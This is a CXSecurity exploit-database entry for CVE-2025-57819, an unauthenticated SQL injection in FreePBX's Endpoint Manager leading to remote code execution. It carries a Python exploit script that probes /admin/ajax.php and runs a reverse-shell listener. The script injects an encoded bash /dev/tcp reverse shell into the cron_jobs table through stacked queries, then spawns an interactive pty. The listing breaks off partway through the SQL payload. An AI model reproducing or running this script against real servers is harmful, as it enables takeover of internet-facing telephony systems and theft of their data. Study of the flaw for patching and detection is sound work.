---
title: FreePBX  17.0.2 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2026090002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-09-06
fetch_date: 2026-09-07T06:48:04.806251
---

# FreePBX  17.0.2 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FreePBX 17.0.2 Remote Code Execution (RCE)** **2026.09.06**  Credit:  **[K3ysTr0K3R](https://cxsecurity.com/author/K3ysTr0K3R/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-57819](https://cxsecurity.com/cveshow/CVE-2025-57819/ "Click to see CVE-2025-57819")**  CWE: **[CWE-288](https://cxsecurity.com/cwe/CWE-288 "Click to see CWE-288")** | |

# Exploit Title: FreePBX 17.0.2 - Remote Code Execution
# Date: 2026-08-12
# Exploit Author: K3ysTr0K3R (Jared Brits)
# Vendor Homepage: https://www.freepbx.org/
# Software Link: https://github.com/FreePBX/freepbx
# Version: FreePBX 15.x < 15.0.66, 16.x < 16.0.89, 17.x < 17.0.3
# Tested on: Linux (Debian/Ubuntu) with Asterisk
# CVE: CVE-2025-57819
# CWE: CWE-89 (SQL Injection), CWE-288 (Authentication Bypass)
# CVSS: 9.8 (Critical) / CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
# Tags: FreePBX, SQL Injection, Authentication Bypass, Remote Code Execution, Unauthenticated, Reverse Shell, Cron Injection, CVE-2025-57819
# References: https://nvd.nist.gov/vuln/detail/CVE-2025-57819 | https://github.com/FreePBX/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h
#
# Description:
# CVE-2025-57819 is a critical unauthenticated SQL injection vulnerability discovered in the
# Endpoint Manager module of FreePBX. The flaw resides in the 'brand' parameter of the
# /admin/ajax.php endpoint, which fails to sanitize user input before using it in SQL queries.
#
# An unauthenticated attacker can exploit this by sending a crafted GET request that injects
# arbitrary SQL commands. Because the application uses stacked queries (multiple statements
# separated by semicolons), an attacker can execute an INSERT statement to add a malicious
# cron job to the 'cron\_jobs' table. This cron job runs a reverse shell command with
# administrative privileges (typically as the Apache user), leading to full remote code
# execution on the underlying server.
#
# The vulnerability affects FreePBX versions 15.x prior to 15.0.66, 16.x prior to 16.0.89,
# and 17.x prior to 17.0.3. It has been assigned a CVSS score of 9.8 (Critical) and is
# listed in CISA's Known Exploited Vulnerabilities catalog.
#
# This exploit automates the process by:
# 1. Validating the target is vulnerable using an error-based SQLi detection.
# 2. Starting a reverse shell listener on the attacker's machine.
# 3. Injecting a base64-encoded reverse shell command into the cron\_jobs table via the SQLi.
# 4. Waiting for the cron job to execute (within 60 seconds) and capturing the shell.
#
# Usage:
# python3 exploit.py -u http://target-freepbx.com --lhost 10.0.0.1 --lport 4444
import sys
import time
import requests
import urllib3
import socket
import threading
import base64
import argparse
from rich.console import Console
console = Console()
def banner():
console.print("[cyan]CVE-2025-57819 • FreePBX Unauth SQLi → RCE[/cyan]")
console.print("[cyan]Coded By: K3ysTr0K3R (Jared Brits)[/cyan]")
console.print("[yellow]Need a hug? ʕっ•ᴥ•ʔっ[/yellow]")
print()
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
def validate\_sqli(target\_url):
vuln\_url = f"{target\_url.rstrip('/')}/admin/ajax.php"
payload = "x' AND EXTRACTVALUE(1,CONCAT('~',(SELECT USER()),'~')) -- -"
params = {
'module': 'FreePBX\\modules\\endpoint\\ajax',
'command': 'model',
'template': 'x',
'model': 'model',
'brand': payload
}
try:
response = requests.get(vuln\_url, params=params, verify=False, timeout=15)
if "XPATH syntax error" in response.text and "freepbxuser" in response.text:
console.print("[green][+][/green] Exploit path confirmed!")
return True
else:
console.print("[red][-][/red] Target immune – no vulnerable signature detected.")
return False
except Exception as e:
console.print(f"[red][-][/red] Probe failed: {e}")
return False
def start\_listener(lhost, lport):
server = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
server.setsockopt(socket.SOL\_SOCKET, socket.SO\_REUSEADDR, 1)
try:
server.bind((lhost, lport))
except Exception as e:
console.print(f"[red][-][/red] Listener deployment failed: {e}")
sys.exit(1)
server.listen(1)
console.print(f"[blue][\*][/blue] Reverse listener armed on {lhost}:{lport}, awaiting callback...")
client, addr = server.accept()
console.print(f"[green][+][/green] Incoming shell session acquired from {addr}!")
pty\_attempts = [
b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n",
b"python -c 'import pty; pty.spawn(\"/bin/bash\")'\n",
b"script -q /dev/null /bin/bash\n",
]
for cmd in pty\_attempts:
client.send(cmd)
time.sleep(0.5)
console.print("[blue][\*][/blue] Interactive control established. Type 'exit' to terminate session.")
def reader():
while True:
try:
data = client.recv(4096)
if not data:
break
sys.stdout.buffer.write(data)
sys.stdout.flush()
except:
break
recv\_thread = threading.Thread(target=reader)
recv\_thread.daemon = True
recv\_thread.start()
try:
while True:
cmd = input()
if cmd.lower() == 'exit':
client.close()
break
client.send((cmd + "\n").encode())
except (EOFError, KeyboardInterrupt):
print()
console.print("[yellow][!][/yellow] Forced session termination.")
client.close()
except Exception as e:
console.print(f"[red][-][/red] Channel error: {e}")
client.close()
console.print("[blue][\*][/blue] Remote session closed.")
def exploit(target\_url, lhost, lport):
banner()
console.print(f"[blue][\*][/blue] Target locked: {target\_url}")
listener\_thread = threading.Thread(target=start\_listener, args=(lhost, lport))
listener\_thread.daemon = True
listener\_thread.start()
time.sleep(1)
if not validate\_sqli(target\_url):
console.print("[red][-][/red] Exploit aborted – target not vulnerable.")
sys.exit(1)
shell\_cmd = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1'"
b64\_shell\_cmd = base64.b64encode(shell\_cmd.encode()).decode()
final\_cmd = f"echo '{b64\_shell\_cmd}' | base64 -d | bash"
hex\_payload = final\_cmd.encode().hex()
sql\_payload = (
f"x' ;INSERT INTO cron\_jobs "
f"(modulename, jobname, command, class, schedule, max\_runtime, enabled, execution\_order) "
f"VALUES ('sysadmin', 'revshell', 0x{hex\_payload}, NULL, '\* \* \* \* \*...